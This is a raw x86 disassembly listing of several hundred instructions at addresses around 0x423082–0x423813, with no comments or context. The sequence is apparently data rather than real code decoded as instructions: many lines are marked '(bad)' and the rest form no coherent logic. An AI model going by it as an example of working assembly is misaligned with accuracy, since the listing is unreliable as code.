  423082:	fwait
  423083:	loope  0x4230f2
  423085:	sub    eax,0xf7dbad7f
  42308a:	sar    BYTE PTR [ebx],cl
  42308c:	(bad)  
  42308d:	add    BYTE PTR [edi-0x1ccd2636],dl
  423093:	aad    0x1
  423095:	add    BYTE PTR [edx+0x0],ah
  423098:	add    BYTE PTR [eax],al
  42309a:	scas   al,BYTE PTR es:[edi]
  42309b:	bound  esi,QWORD PTR [ecx-0x365bf6ba]
  4230a1:	xchg   ebp,eax
  4230a2:	dec    eax
  4230a3:	add    ah,BYTE PTR [ecx+0x55]
  4230a6:	(bad)  
  4230a7:	xchg   esi,eax
  4230a8:	inc    BYTE PTR [ebx+0x4f7fa055]
  4230ae:	cmp    eax,0xf56c512b
  4230b3:	inc    eax
  4230b5:	jmp    0x423044
  4230b7:	imul   ecx,DWORD PTR [esi],0xffffffa6
  4230ba:	das    
  4230bb:	jg     0x4230fe
  4230bd:	add    dl,bh
  4230bf:	jns    0x42306e
  4230c1:	and    al,dl
  4230c3:	mov    esp,0x2f4c278
  4230c8:	xchg   DWORD PTR ds:0xf1489444,eax
  4230ce:	clc    
  4230cf:	pop    edi
  4230d0:	xchg   esi,eax
  4230d1:	repnz mov al,0x3a
  4230d4:	and    al,BYTE PTR [ebx]
  4230d6:	int    0xbf
  4230d8:	cmp    ax,0x64b0
  4230dc:	arpl   WORD PTR [esi+0x7],cx
  4230df:	outs   dx,DWORD PTR ds:[esi]
  4230e0:	scas   al,BYTE PTR es:[edi]
  4230e1:	or     BYTE PTR [edx+0x51a8e857],cl
  4230e7:	lock fsub DWORD PTR [edi+0x7b]
  4230eb:	dec    esp
  4230ec:	aas    
  4230ed:	lods   eax,DWORD PTR ds:[esi]
  4230ee:	xchg   bh,ch
  4230f0:	jns    0x423107
  4230f2:	and    DWORD PTR [esi],ebx
  4230f4:	aam    0x85
  4230f6:	sub    al,BYTE PTR [ebx+0x38]
  4230f9:	test   DWORD PTR [edi+0x74],0x8000000
  423103:	div    DWORD PTR [edi+0x4a]
  423106:	dec    edx
  423108:	cmp    eax,0x2e8eedf7
  42310d:	dec    eax
  42310e:	test   edx,esp
  423110:	jg     0x423178
  423112:	inc    ebp
  423113:	(bad)  
  423114:	add    DWORD PTR [eax],eax
  423116:	bound  eax,QWORD PTR [eax]
  423118:	add    BYTE PTR [eax],al
  42311a:	fwait
  42311b:	shr    eax,1
  42311d:	push   eax
  42311e:	popw   ds
  423120:	cmp    edi,DWORD PTR [edi+0x1b]
  423123:	push   edi
  423124:	inc    edi
  423125:	pusha  
  423126:	push   0x42
  423128:	xor    DWORD PTR [ecx-0x1996a1ae],edx
  42312e:	xchg   edi,eax
  42312f:	repz or DWORD PTR [edi],0x4125e6d5
  423136:	jmp    0x3952:0x1bbe7829
  42313d:	mov    esp,0xab8af201
  423142:	pop    ebx
  423143:	xchg   ebx,eax
  423144:	adc    DWORD PTR [edi],esp
  423146:	push   edi
  423147:	sbb    bl,dl
  423149:	xor    bl,al
  42314b:	iret   
  42314c:	into   
  42314d:	(bad)  
  42314e:	in     al,dx
  42314f:	jmp    0xf8c61ad2
  423154:	test   al,0x91
  423156:	in     al,dx
  423157:	scas   al,BYTE PTR es:[edi]
  423158:	cld    
  423159:	push   eax
  42315a:	popf   
  42315b:	int3   
  42315c:	aas    
  42315d:	xchg   ecx,eax
  42315e:	jae    0x423134
  423160:	lea    ebx,[edi-0x7405a875]
  423166:	sub    esp,DWORD PTR [ebx]
  423168:	outs   dx,BYTE PTR ds:[esi]
  423169:	rcr    DWORD PTR [esi-0x43022c6c],cl
  42316f:	into   
  423170:	inc    edi
  423171:	jmp    0xac0a:0x334533c2
  423178:	xchg   ebx,eax
  423179:	xchg   ebp,eax
  42317a:	cmp    DWORD PTR [ebx],eax
  42317c:	add    BYTE PTR [eax],al
  42317e:	add    BYTE PTR [eax],al
  423180:	add    BYTE PTR [eax],al
  423182:	arpl   WORD PTR ss:[eax-0x10],bp
  423186:	jge    0x423183
  423188:	mov    esi,0x8c7853e7
  42318d:	daa    
  42318e:	cmp    DWORD PTR [ebp-0x2b],ebp
  423191:	push   esi
  423192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423193:	(bad)  
  423194:	add    DWORD PTR [eax],eax
  423196:	bound  eax,QWORD PTR [eax]
  423198:	add    BYTE PTR [eax],al
  42319a:	into   
  42319b:	pop    ss
  42319c:	ins    BYTE PTR es:[edi],dx
  42319d:	push   cs
  42319e:	mov    ebp,0x79e34258
  4231a3:	push   cs
  4231a4:	jmp    0x737adbdc
  4231a9:	xchg   BYTE PTR [eax-0x630a4dd3],ch
  4231af:	shl    ebp,0xc3
  4231b2:	stos   DWORD PTR es:[edi],eax
  4231b3:	fadd   st,st(4)
  4231b5:	push   0xc246b883
  4231ba:	jno    0x4231b4
  4231bc:	push   ds
  4231bd:	xor    ah,BYTE PTR [esi-0x9]
  4231c0:	mov    BYTE PTR [edi+0x0],bl
  4231c3:	outs   dx,BYTE PTR ds:[esi]
  4231c4:	loop   0x4231ba
  4231c6:	fisub  DWORD PTR [edx+0x3e]
  4231c9:	fcmovnbe st,st(0)
  4231cb:	out    0x7f,al
  4231cd:	fdiv   QWORD PTR ss:[edx-0x5]
  4231d1:	aas    
  4231d2:	pushf  
  4231d3:	sub    DWORD PTR [ebx],esp
  4231d5:	adc    eax,DWORD PTR [eax+0xe8a5c6f]
  4231db:	dec    ebx
  4231dc:	pop    edx
  4231dd:	(bad)  
  4231de:	adc    eax,0xf630fee7
  4231e3:	mov    ebp,edx
  4231e5:	and    BYTE PTR [eax],bl
  4231e7:	ins    DWORD PTR es:[edi],dx
  4231e8:	cld    
  4231e9:	dec    edx
  4231ea:	sub    al,0x76
  4231ec:	(bad)  
  4231ed:	mov    cl,0x79
  4231ef:	add    DWORD PTR [esi+eax*4-0x6852adb7],edi
  4231f6:	and    al,0x7
  4231f8:	call   0x1249b47
  4231fd:	add    BYTE PTR [eax],al
  4231ff:	add    BYTE PTR [eax],al
  423201:	add    BYTE PTR [edi],ah
  423203:	ss lahf 
  423205:	xor    DWORD PTR [edi+0x1536afb9],ebx
  42320b:	and    eax,0xf75c075b
  423210:	outs   dx,DWORD PTR ds:[esi]
  423211:	cmp    cl,BYTE PTR [edi-0x22]
  423214:	add    DWORD PTR [eax],eax
  423216:	bound  eax,QWORD PTR [eax]
  423218:	add    BYTE PTR [eax],al
  42321a:	int3   
  42321b:	pusha  
  42321c:	or     bh,BYTE PTR [esi]
  42321e:	cmp    ch,BYTE PTR [esp+edx*8+0x6a]
  423222:	stc    
  423223:	xor    cl,bl
  423225:	sub    eax,0x418417fc
  42322a:	jns    0x423202
  42322c:	arpl   bp,si
  42322e:	mov    bl,0x6a
  423230:	(bad)  
  423231:	cmc    
  423232:	cmp    BYTE PTR [eax],al
  423234:	das    
  423235:	pop    edi
  423236:	call   0xc4ad:0x97bd8d41
  42323d:	inc    edi
  42323e:	sub    DWORD PTR [ecx+0x1f],ebp
  423241:	lahf   
  423242:	and    DWORD PTR [eax],esi
  423244:	or     dh,BYTE PTR [ebx]
  423246:	(bad)  
  423247:	in     eax,0x0
  423249:	xchg   edx,eax
  42324a:	inc    ebp
  42324b:	repz fldcw WORD PTR [eax+0x5b83b2e7]
  423252:	mov    bl,0x13
  423254:	dec    ebx
  423255:	mov    BYTE PTR [esi-0x7647cb9c],al
  42325b:	mov    cl,0xd5
  42325d:	ror    ah,cl
  42325f:	das    
  423260:	out    0xc9,al
  423262:	adc    eax,0x36590ff8
  423267:	add    DWORD PTR [ebx],0x7f
  42326a:	in     eax,0xa8
  42326c:	xchg   ecx,eax
  42326d:	outs   dx,DWORD PTR ds:[esi]
  42326e:	jns    0x4231f2
  423270:	ret    
  423271:	cld    
  423272:	pop    eax
  423273:	rol    BYTE PTR [esi-0xb],0x90
  423277:	aad    0x2
  423279:	ins    DWORD PTR es:[edi],dx
  42327a:	mov    al,ds:0x80
  42327f:	add    BYTE PTR [eax],al
  423281:	add    BYTE PTR [edi],dh
  423283:	(bad)  
  423284:	out    0xc2,eax
  423286:	mul    ebx
  423288:	aaa    
  423289:	cmc    
  42328a:	xchg   ecx,eax
  42328b:	call   0x6e8d:0x5e19eef4
  423292:	mov    cl,0xde
  423294:	add    DWORD PTR [eax],eax
  423296:	bound  eax,QWORD PTR [eax]
  423298:	add    BYTE PTR [eax],al
  42329a:	sbb    DWORD PTR [edx+0x69],ebx
  42329d:	mov    ds:0x15d0b037,eax
  4232a2:	adc    esi,DWORD PTR [esi]
  4232a4:	sbb    eax,DWORD PTR [ecx+0x63]
  4232a7:	sbb    eax,0xe0c5015b
  4232ac:	je     0x4232ec
  4232ae:	aaa    
  4232af:	cmp    al,0x8d
  4232b1:	mov    ebp,0x656d6eac
  4232b6:	adc    esp,0x0
  4232b9:	mov    ecx,0x4ae66b8
  4232be:	jl     0x42325a
  4232c0:	in     al,0x69
  4232c2:	sar    DWORD PTR [ebx],1
  4232c4:	cmc    
  4232c5:	push   esi
  4232c6:	mov    DWORD PTR [ecx+0x258a550e],0x4118144d
  4232d0:	imul   ebx,DWORD PTR [edx+0x4002d772],0x2c0701e4
  4232da:	mov    edx,0x3d83df49
  4232df:	idiv   DWORD PTR ds:0xe8d119cf
  4232e5:	cdq    
  4232e6:	and    eax,0x854d8abc
  4232eb:	rol    cl,0x96
  4232ee:	xlat   BYTE PTR ds:[ebx]
  4232ef:	dec    ecx
  4232f0:	hlt    
  4232f1:	fisubr DWORD PTR [esi-0x26d4d1d2]
  4232f7:	sbb    ch,dh
  4232f9:	pusha  
  4232fa:	pop    ss
  4232fb:	call   0x423300
  423300:	add    BYTE PTR [eax],al
  423302:	push   ss
  423303:	aad    0xdf
  423305:	out    dx,eax
  423306:	fucomip st,st(7)
  423308:	ss std 
  42330a:	cmp    BYTE PTR [esi-0x2d85a0c6],al
  423310:	push   eax
  423311:	xchg   esp,eax
  423312:	adc    ebx,edi
  423314:	add    DWORD PTR [eax],eax
  423316:	bound  eax,QWORD PTR [eax]
  423318:	add    BYTE PTR [eax],al
  42331a:	sahf   
  42331b:	dec    ecx
  42331c:	adc    al,0xc9
  42331e:	pop    ds
  42331f:	xchg   edi,eax
  423320:	add    ebp,DWORD PTR [eax-0x33]
  423323:	and    ch,BYTE PTR [eax+esi*2+0x7e]
  423327:	xchg   BYTE PTR [edx-0x33a34192],dl
  42332d:	lds    ebp,FWORD PTR [ebp+0x1a]
  423330:	lahf   
  423331:	imul   esp,esi,0x8
  423334:	mov    esi,0x8f76112a
  423339:	sub    bl,ch
  42333b:	xchg   esp,eax
  42333c:	sti    
  42333d:	sub    eax,0x29699d26
  423342:	sbb    DWORD PTR [edx-0x56],eax
  423345:	loope  0x4232f1
  423347:	stos   DWORD PTR es:[edi],eax
  423348:	shl    DWORD PTR [edi+edx*4],0x71
  42334c:	sub    ebp,DWORD PTR fs:[bx+di+0x77]
  423351:	and    BYTE PTR [ebx-0xb],ch
  423354:	fst    st(5)
  423356:	loop   0x4233aa
  423358:	xchg   esi,eax
  423359:	mov    edx,0x30b0ca2f
  42335e:	cmc    
  42335f:	push   edi
  423360:	(bad)  
  423361:	in     al,0x87
  423363:	xchg   ecx,edx
  423365:	icebp  
  423366:	les    ebx,FWORD PTR [edi-0x26f06442]
  42336c:	mov    al,0x3b
  42336e:	imul   esi,DWORD PTR [ebp-0x22],0xb49eb6c6
  423375:	cmp    al,0xdd
  423377:	sbb    al,0x5c
  423379:	mov    al,0x9a
  42337b:	jge    0x42337d
  42337d:	add    BYTE PTR [eax],al
  42337f:	add    BYTE PTR [eax],al
  423381:	add    BYTE PTR [esi+0x76],ch
  423384:	in     al,0xca
  423386:	cld    
  423387:	fisubr DWORD PTR [esi-0xa]
  42338a:	sbb    BYTE PTR [edx-0x76f6879],dl
  423390:	icebp  
  423391:	sbb    DWORD PTR [ebp-0x21],esi
  423394:	add    DWORD PTR [eax],eax
  423396:	bound  eax,QWORD PTR [eax]
  423398:	add    BYTE PTR [eax],al
  42339a:	lods   al,BYTE PTR ds:[esi]
  42339b:	mov    eax,0xd1c22fa5
  4233a0:	into   
  4233a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233a2:	jne    0x4233be
  4233a4:	jne    0x423347
  4233a6:	outs   dx,DWORD PTR ds:[esi]
  4233a7:	(bad)  
  4233a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233a9:	das    
  4233aa:	xor    bh,ch
  4233ac:	cmp    dh,BYTE PTR [ebx]
  4233ae:	cdq    
  4233af:	adc    esi,DWORD PTR [edi-0x4]
  4233b2:	or     eax,DWORD PTR [edi-0x85f2ad1]
  4233b8:	jb     0x423353
  4233ba:	nop
  4233bb:	dec    ebp
  4233bc:	jno    0x423424
  4233be:	jne    0x423417
  4233c0:	xlat   BYTE PTR ds:[ebx]
  4233c1:	aaa    
  4233c2:	mov    bh,0xfc
  4233c4:	dec    esi
  4233c5:	or     ah,BYTE PTR [esp+esi*2-0x6c]
  4233c9:	pop    es
  4233ca:	and    al,0x4e
  4233cc:	cmc    
  4233cd:	out    0x9a,al
  4233cf:	jg     0x423357
  4233d1:	pop    edx
  4233d2:	jecxz  0x423373
  4233d4:	lods   al,BYTE PTR ds:[esi]
  4233d5:	(bad)  
  4233d6:	aam    0x15
  4233d8:	xor    cl,BYTE PTR [edi]
  4233da:	mov    edx,0xd260f819
  4233df:	hlt    
  4233e0:	lds    esp,FWORD PTR [edi-0x5e967381]
  4233e6:	enter  0xab63,0x32
  4233ea:	inc    esp
  4233eb:	mov    cl,0x54
  4233ed:	test   al,0xa2
  4233ef:	imul   ebx,DWORD PTR [eax+0x58739387],0x4d
  4233f6:	imul   edi,DWORD PTR [eax+ebp*2+0xf796a0],0x0
  423401:	add    BYTE PTR [edx],bh
  423403:	push   edx
  423404:	les    ecx,FWORD PTR [edi]
  423406:	in     al,dx
  423407:	lahf   
  423408:	sti    
  423409:	ja     0x423401
  42340b:	rcl    DWORD PTR [eax+0x10763bd3],1
  423411:	mov    al,0xd7
  423413:	fild   WORD PTR [ecx]
  423415:	add    BYTE PTR [edx+0x0],ah
  423418:	add    BYTE PTR [eax],al
  42341a:	loopne 0x423457
  42341c:	push   ebp
  42341d:	and    eax,0xe1edb506
  423422:	mov    BYTE PTR [edx+0x73],cl
  423425:	mov    ds:0x85ce38df,eax
  42342a:	pop    eax
  42342b:	outs   dx,DWORD PTR ds:[esi]
  42342d:	bound  ecx,QWORD PTR ss:[ecx]
  423430:	lods   al,BYTE PTR ds:[esi]
  423431:	mov    al,ds:0x2369fb69
  423436:	mov    al,ds:0xaf1e116e
  42343b:	(bad)  
  42343c:	pushf  
  42343d:	mov    ebx,0x9a2a1121
  423442:	jecxz  0x42341f
  423444:	scas   eax,DWORD PTR es:[edi]
  423445:	aad    0x23
  423447:	leave  
  423448:	sub    dh,ch
  42344a:	in     al,dx
  42344b:	xlat   BYTE PTR ds:[ebx]
  42344c:	or     al,0x68
  42344e:	icebp  
  42344f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423450:	jp     0x4233d4
  423452:	(bad)  
  423453:	fucom  st(7)
  423455:	jecxz  0x4234c9
  423457:	shl    BYTE PTR [ecx+0x336bf4c4],1
  42345d:	movsx  ecx,WORD PTR [eax+ebp*4-0x7]
  423462:	jns    0x4234c0
  423464:	(bad)  
  423465:	or     DWORD PTR [ecx-0x31],ecx
  423468:	std    
  423469:	cmc    
  42346a:	aas    
  42346b:	test   esi,esi
  42346d:	cdq    
  42346e:	fwait
  42346f:	out    dx,al
  423470:	push   edx
  423471:	rcl    DWORD PTR [ebx+0x2a79d098],1
  423477:	or     cl,cl
  423479:	fisub  DWORD PTR [eax+0xdc]
  42347f:	add    BYTE PTR [eax],al
  423481:	add    BYTE PTR [ebx-0x4293427d],dl
  423487:	jle    0x42345c
  423489:	call   DWORD PTR [eax-0x20]
  42348c:	cli    
  42348d:	call   0xe039:0x3d317916
  423494:	add    DWORD PTR [eax],eax
  423496:	bound  eax,QWORD PTR [eax]
  423498:	add    BYTE PTR [eax],al
  42349a:	cdq    
  42349b:	sub    BYTE PTR [ecx+0xa],ch
  42349e:	adc    bh,BYTE PTR [eax+0x1d60c1fd]
  4234a4:	pop    ds
  4234a5:	or     ebx,esi
  4234a7:	pop    ebp
  4234a8:	add    al,0xa6
  4234aa:	aas    
  4234ab:	loope  0x4234dd
  4234ad:	mov    esi,0x7dd57739
  4234b2:	sbb    BYTE PTR [ecx-0xffc7a36],dl
  4234b8:	xlat   BYTE PTR ds:[ebx]
  4234b9:	shl    BYTE PTR [ebp+0x0],0x7e
  4234bd:	mov    DWORD PTR [ecx+eiz*1],edx
  4234c0:	mov    ecx,0xd7e7665c
  4234c5:	mov    bh,0xc1
  4234c7:	pop    es
  4234c8:	outs   dx,DWORD PTR ds:[esi]
  4234c9:	retf   0xfe80
  4234cc:	push   ss
  4234cd:	(bad)  
  4234ce:	retf   
  4234cf:	in     al,dx
  4234d0:	aam    0xf7
  4234d2:	jbe    0x423494
  4234d4:	sub    eax,0x660df652
  4234d9:	aas    
  4234da:	pop    ss
  4234db:	push   edx
  4234dc:	dec    ebx
  4234dd:	mov    BYTE PTR [ecx+0xb],cl
  4234e0:	bound  ebp,QWORD PTR [edi-0x6eca9423]
  4234e6:	ret    
  4234e7:	iret   
  4234e8:	test   dh,dh
  4234ea:	scas   al,BYTE PTR es:[edi]
  4234eb:	pusha  
  4234ec:	mov    edx,0x75dc76a3
  4234f1:	and    al,0xa0
  4234f3:	mov    DWORD PTR [esi],edx
  4234f5:	clc    
  4234f6:	xchg   esp,eax
  4234f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234f8:	cmp    cl,al
  4234fa:	aas    
  4234fb:	and    DWORD PTR [eax],eax
  4234fd:	add    BYTE PTR [eax],al
  4234ff:	add    BYTE PTR [eax],al
  423501:	add    ah,bl
  423503:	fincstp 
  423505:	shl    bh,0xee
  423508:	(bad)  
  423509:	frstor [ecx+eax*1]
  42350c:	pop    ebp
  42350d:	dec    edi
  42350e:	mov    al,0xc6
  423510:	in     al,dx
  423511:	loop   0x4234ae
  423513:	loopne 0x423516
  423515:	add    BYTE PTR [edx+0x0],ah
  423518:	add    BYTE PTR [eax],al
  42351a:	or     BYTE PTR [eax-0x7b73f862],dl
  423520:	pusha  
  423521:	pop    edx
  423522:	mov    ds:0xb229d677,al
  423527:	cmc    
  423528:	in     al,0xa8
  42352a:	xor    eax,0x53e56b7e
  42352f:	repnz mov bh,0x1c
  423532:	add    eax,0xe97308ed
  423537:	xchg   ecx,eax
  423538:	jns    0x42350e
  42353a:	ins    BYTE PTR es:[edi],dx
  42353b:	pushf  
  42353c:	ret    
  42353d:	adc    eax,0x77b2ee3e
  423542:	jp     0x423533
  423544:	ins    BYTE PTR es:[edi],dx
  423545:	push   edi
  423546:	push   cs
  423547:	fidivr WORD PTR [eax+0x36]
  42354a:	adc    edx,ecx
  42354c:	jmp    0x423556
  42354e:	add    BYTE PTR [ebx+0x7b],dl
  423551:	outs   dx,BYTE PTR ds:[esi]
  423552:	call   0xc317e9f
  423557:	test   BYTE PTR [edx],0x80
  42355a:	daa    
  42355b:	mov    bh,0xf1
  42355d:	xchg   ebp,eax
  42355e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42355f:	push   ebp
  423560:	dec    ebx
  423561:	fcompp 
  423563:	rcl    BYTE PTR [ecx-0x22],cl
  423566:	push   edi
  423567:	push   ds
  423568:	inc    ebp
  423569:	fwait
  42356a:	cli    
  42356b:	cld    
  42356c:	sub    eax,0x93fe93ef
  423571:	(bad)  [esi-0x38]
  423574:	inc    ebp
  423575:	jmp    0x7102:0xa59d34c7
  42357c:	add    BYTE PTR [eax],al
  42357e:	add    BYTE PTR [eax],al
  423580:	add    BYTE PTR [eax],al
  423582:	outs   dx,DWORD PTR ds:[esi]
  423583:	mov    ds:0x7edd2ad4,al
  423588:	jmp    edi
  42358a:	push   edx
  42358b:	fcmovu st,st(5)
  42358d:	in     eax,0xba
  42358f:	fs push 0x1e0fd6f
  423595:	add    BYTE PTR [edx+0x0],ah
  423598:	add    BYTE PTR [eax],al
  42359a:	aas    
  42359b:	push   0x566a42f7
  4235a0:	sub    cl,BYTE PTR [ecx]
  4235a2:	popf   
  4235a3:	push   eax
  4235a4:	scas   eax,DWORD PTR es:[edi]
  4235a5:	int3   
  4235a6:	jle    0x423591
  4235a8:	test   BYTE PTR [ebx+eax*4+0x14],0x6d
  4235ad:	add    ah,BYTE PTR [ebp+0x663338dc]
  4235b3:	ror    BYTE PTR [ecx+0xc],0x66
  4235b7:	xchg   ebp,eax
  4235b8:	dec    edx
  4235b9:	push   edx
  4235ba:	pop    esi
  4235bb:	aad    0x3
  4235bd:	jo     0x4235ba
  4235bf:	mov    bh,0xdd
  4235c1:	pop    ebp
  4235c2:	cmp    DWORD PTR [eax+0x44],0x2562366e
  4235c9:	ds pop esp
  4235cb:	mov    ebx,0x4ab2a874
  4235d0:	mov    ebx,0xfa2142d3
  4235d5:	push   ebp
  4235d6:	jecxz  0x42363c
  4235d8:	mov    esp,0x22861df3
  4235dd:	xchg   BYTE PTR [esi+ebx*1-0x56],dh
  4235e1:	popf   
  4235e2:	mov    esp,0xb83f2285
  4235e7:	imul   esp,DWORD PTR [edx+ebp*8-0x32066685],0x38
  4235ef:	push   edx
  4235f0:	add    DWORD PTR [ebp-0x51],esp
  4235f3:	push   ds
  4235f4:	pop    edi
  4235f5:	mov    dl,0x82
  4235f7:	pop    ebx
  4235f8:	and    BYTE PTR [ecx+0x4694],0x0
  4235ff:	add    BYTE PTR [eax],al
  423601:	add    cl,bh
  423603:	sbb    al,al
  423605:	inc    esi
  423606:	jecxz  0x4235e6
  423608:	(bad)  
  423609:	mov    edi,0xe1f1bc83
  42360e:	fist   WORD PTR ds:0xe15f1330
  423614:	add    DWORD PTR [eax],eax
  423616:	bound  eax,QWORD PTR [eax]
  423618:	add    BYTE PTR [eax],al
  42361a:	pop    eax
  42361b:	std    
  42361c:	fsub   DWORD PTR [esi-0x53]
  42361f:	or     ah,BYTE PTR [eax-0xe288684]
  423625:	or     eax,0x80240351
  42362a:	fwait
  42362b:	sub    ecx,eax
  42362d:	add    eax,0x2ecb9f58
  423632:	add    esi,DWORD PTR [esi+edx*2-0x6d1da9a7]
  423639:	mov    bh,dl
  42363b:	inc    ebx
  42363c:	sbb    dl,BYTE PTR [edx]
  42363e:	cmp    ch,dh
  423640:	(bad)  
  423641:	lock mov ah,dh
  423644:	jb     0x42364a
  423646:	pop    eax
  423647:	inc    ebx
  423648:	cdq    
  423649:	ins    BYTE PTR es:[edi],dx
  42364a:	adc    al,0x93
  42364c:	adc    dl,BYTE PTR [esi-0x396c4429]
  423652:	and    BYTE PTR [ebx-0x2f],dh
  423655:	call   0x9bd22bf7
  42365a:	sti    
  42365b:	mov    ah,0x5a
  42365d:	cmp    al,0xb2
  42365f:	jle    0x42363f
  423661:	xor    BYTE PTR [edx-0x2e],bh
  423664:	cmp    BYTE PTR [edi],al
  423666:	cmp    al,0x22
  423668:	test   al,0x8
  42366a:	jb     0x4236d4
  42366c:	retf   
  42366d:	out    dx,al
  42366e:	pushf  
  42366f:	push   esp
  423670:	inc    edx
  423671:	in     eax,0xc7
  423673:	in     eax,dx
  423674:	and    dh,BYTE PTR [esi+0x7b]
  423677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423678:	jge    0x423601
  42367a:	cmp    DWORD PTR [edx+0x0],esi
  42367d:	add    BYTE PTR [eax],al
  42367f:	add    BYTE PTR [eax],al
  423681:	add    BYTE PTR [ecx+0x3e8336b9],ah
  423687:	(bad)  
  423688:	mov    ch,0xbb
  42368a:	icebp  
  42368b:	and    eax,0x3c858c27
  423690:	clc    
  423691:	mov    ecx,es
  423693:	loope  0x423696
  423695:	add    BYTE PTR [edx+0x0],ah
  423698:	add    BYTE PTR [eax],al
  42369a:	xchg   edx,eax
  42369b:	test   eax,0x2386fc86
  4236a0:	out    dx,eax
  4236a1:	ja     0x423650
  4236a3:	or     al,0xbb
  4236a5:	ja     0x42369d
  4236a7:	or     eax,0xc6bda05f
  4236ac:	out    0xdf,eax
  4236ae:	cmc    
  4236af:	sbb    DWORD PTR [esi+0x71cc95a2],esi
  4236b5:	sub    ecx,edx
  4236b7:	adc    DWORD PTR [esp+edx*1+0x60],eax
  4236bb:	ins    BYTE PTR es:[edi],dx
  4236bc:	pushf  
  4236bd:	std    
  4236be:	pusha  
  4236bf:	cdq    
  4236c0:	test   esp,0x789aef85
  4236c6:	pop    esp
  4236c7:	mov    bh,0x89
  4236c9:	clc    
  4236ca:	xor    eax,0x68750b3b
  4236cf:	inc    edx
  4236d0:	mov    edi,0xe62fa814
  4236d5:	mov    bl,0x29
  4236d7:	jl     0x42369d
  4236d9:	xchg   esi,eax
  4236da:	dec    esp
  4236db:	or     BYTE PTR [eax-0x72],ch
  4236de:	ins    BYTE PTR es:[edi],dx
  4236df:	aaa    
  4236e0:	pop    ebx
  4236e1:	dec    ebx
  4236e2:	mov    dh,dh
  4236e4:	ss jg  0x4236e1
  4236e7:	xor    DWORD PTR [ebx],ecx
  4236e9:	jge    0x42369b
  4236eb:	mov    esi,0xb0019fe7
  4236f0:	nop
  4236f1:	xor    edx,DWORD PTR [esi+esi*4+0x1a]
  4236f5:	mov    WORD PTR [eax],fs
  4236f7:	adc    eax,0xb9826538
  4236fc:	add    BYTE PTR [eax],al
  4236fe:	add    BYTE PTR [eax],al
  423700:	add    BYTE PTR [eax],al
  423702:	adc    dl,bh
  423704:	repz or esi,edi
  423707:	das    
  423708:	cli    
  423709:	fist   WORD PTR [ecx]
  42370b:	dec    ebx
  42370c:	es nop
  42370e:	jbe    0x423770
  423710:	pop    DWORD PTR [ebx+eiz*1-0x1e]
  423714:	add    DWORD PTR [eax],eax
  423716:	bound  eax,QWORD PTR [eax]
  423718:	add    BYTE PTR [eax],al
  42371a:	adc    DWORD PTR [ebx-0x4a],esi
  42371d:	(bad)  
  42371e:	(bad)  
  423720:	add    DWORD PTR [ebx],ecx
  423722:	je     0x4236ed
  423724:	jnp    0x423792
  423726:	xor    ecx,edx
  423728:	sub    dh,BYTE PTR [ebx]
  42372a:	mov    al,0x29
  42372c:	(bad)  
  42372f:	jmp    0xb768:0xeb85b8d8
  423736:	pop    eax
  423737:	or     BYTE PTR [ebp+0x3e682251],dl
  42373d:	ret    
  42373e:	leave  
  42373f:	mov    ch,0x21
  423741:	pop    esp
  423742:	sar    DWORD PTR [bx+si-0x78eb],1
  423747:	mov    WORD PTR [ebx],ss
  423749:	or     al,0x53
  42374b:	cmp    eax,0x3297a53d
  423750:	shl    ebp,1
  423752:	sbb    BYTE PTR [edi],0x93
  423755:	mov    edi,0x7abad7e2
  42375a:	jmp    0x5a75:0xc0664eb5
  423761:	dec    esp
  423762:	jecxz  0x42372f
  423764:	or     BYTE PTR [edi+0x6ad57364],bh
  42376a:	xchg   ebx,eax
  42376b:	push   esi
  42376c:	adc    eax,0x6436512f
  423771:	jl     0x4237b1
  423773:	add    al,0x2d
  423775:	sbb    DWORD PTR [eax-0x589e9339],eax
  42377b:	out    dx,eax
  42377c:	add    BYTE PTR [eax],al
  42377e:	add    BYTE PTR [eax],al
  423780:	add    BYTE PTR [eax],al
  423782:	adc    bh,BYTE PTR [edx-0x19073928]
  423788:	push   ds
  423789:	(bad)  
  42378a:	adc    bl,dh
  42378c:	cwde   
  42378d:	out    dx,al
  42378e:	mov    ebp,0x8505ede2
  423793:	loop   0x423796
  423795:	add    BYTE PTR [edx+0x0],ah
  423798:	add    BYTE PTR [eax],al
  42379a:	mov    ah,0x7d
  42379c:	arpl   WORD PTR [eax+0x67fb2a96],bx
  4237a2:	jne    0x4237b5
  4237a4:	push   esp
  4237a5:	mov    al,0xb7
  4237a7:	mov    esp,0xdae4dbbf
  4237ac:	cmp    ebx,DWORD PTR [esp+0x65]
  4237b0:	in     al,0x86
  4237b2:	outs   dx,BYTE PTR ds:[esi]
  4237b3:	cli    
  4237b4:	xor    BYTE PTR [edi-0x54],dh
  4237b7:	inc    esi
  4237b8:	int    0xf6
  4237ba:	fcom   QWORD PTR [edi]
  4237bc:	int3   
  4237bd:	cdq    
  4237be:	repnz aad 0x74
  4237c1:	add    BYTE PTR [esi],ch
  4237c3:	push   eax
  4237c4:	out    dx,eax
  4237c5:	dec    edi
  4237c6:	push   ss
  4237c7:	jns    0x4237eb
  4237c9:	adc    eax,0x772381bd
  4237ce:	mov    gs,edx
  4237d0:	aaa    
  4237d1:	(bad)  
  4237d2:	enter  0x4ae3,0x31
  4237d6:	mov    bh,0x85
  4237d8:	inc    ebx
  4237d9:	pop    edx
  4237da:	retf   0xb57e
  4237dd:	inc    edx
  4237de:	mov    eax,ds:0x3a99715a
  4237e3:	xchg   DWORD PTR [edi+0x47],ebx
  4237e6:	int3   
  4237e7:	pop    edi
  4237e8:	sub    ebp,edi
  4237ea:	inc    edi
  4237eb:	es ja  0x423857
  4237ee:	repz pop esi
  4237f0:	add    al,0x5f
  4237f2:	inc    ebx
  4237f3:	sbb    DWORD PTR [edx-0x3391d459],ebx
  4237f9:	sbb    DWORD PTR [eax+eiz*8],edi
  4237fc:	add    BYTE PTR [eax],al
  4237fe:	add    BYTE PTR [eax],al
  423800:	add    BYTE PTR [eax],al
  423802:	add    al,al
  423804:	inc    edx
  423805:	add    BYTE PTR [eax+eax*8],al
  423808:	inc    edx
  423809:	add    BYTE PTR [eax],cl
  42380b:	rol    BYTE PTR [edx+0x0],0xc
  42380f:	rol    BYTE PTR [edx+0x0],0x10
  423813:	rol    BYTE PTR [edx+0x0],0x14
